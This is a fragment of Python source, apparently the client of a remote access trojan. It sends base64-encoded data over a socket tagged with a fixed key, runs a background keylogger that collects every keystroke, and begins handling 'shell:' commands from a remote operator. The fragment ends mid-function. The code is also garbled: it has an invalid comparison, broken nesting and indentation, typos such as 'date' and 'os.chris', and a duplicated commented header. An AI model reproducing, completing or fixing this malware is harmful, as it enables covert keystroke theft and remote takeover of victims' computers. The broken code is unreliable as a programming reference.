# class CLIENT:

#     SOCK = None
#     KEY  = ")J@NcRfU"
#     KEYLOGGER_STATUS = False
#     KEYLOGGER_STROKES = ""

#     def __init__(self, _ip, _pt):
#         self.ipaddress = _ip
#         self.port      = _pt

class CLIENT:

    SOCK = None
    KEY = ")J@NcRfU"
    KEYLOGGER_STATUS = False
    KEYLOGGER_STROKES = ""

    def __init__(self, _ip, _pt):
        self.ipaddress = _ip
        self.port      = _pt
    
    def send_data(self, tosend, encode=True):
        if encode:
            self.SOCK.send(base64.encodebytes(tosend.encode('utf-8')) + self.KEY.encode('utf-8'))
        else:
            self.SOCK.send(base64.encodebytes(tosend) + self.KEY.encode('utf-8'))

    def turn_keylogger(self, status):
        def on_press(key):
            if not self.KEYLOGGER_STATUS:
                return False

        key = str(key)

        if len(key.strip('\'')) = 1:
            self.KEYLOGGER_STROKES += key.strip('\'')
        else:
            self.KEYLOGGER_STROKES += ("[" + key + "]")

    def on_release(key):
        if not self.KEYLOGGER_STATUS:
            return False
        
        def logger():
            with Listener(on_press=on_press, on_release=on_release) as listener:
                listener.join()
            
        if status:
            if not self.KEYLOGGER_STATUS:
                self.KEYLOGGER_STATUS = True
                t = threading.Thread(target=logger)
                t.daemon = True
                t.start()
        else:
            self.KEYLOGGER_STATUS = False


        def execute(self, command):
            data = command.decode('utf-8').split(":")

            if data[0] == "shell":
                toexecute = date[1].rstrip(" ").lstrip
                toexecute = "".join(toexecute.split())
                if toexecute.split(" ")[0] == "cd":
                    try:
                        os.chris(toexecute.split(" ")[1])